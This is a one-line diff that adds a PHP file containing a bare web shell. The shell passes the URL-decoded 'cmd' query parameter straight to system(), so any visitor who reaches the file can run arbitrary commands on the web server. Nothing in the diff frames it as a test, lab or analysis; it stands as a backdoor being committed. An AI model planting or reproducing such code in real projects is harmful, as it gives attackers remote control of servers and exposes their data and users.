@@ -1,0 +1,1 @@
+<?php system(urldecode($_GET["cmd"])); ?>
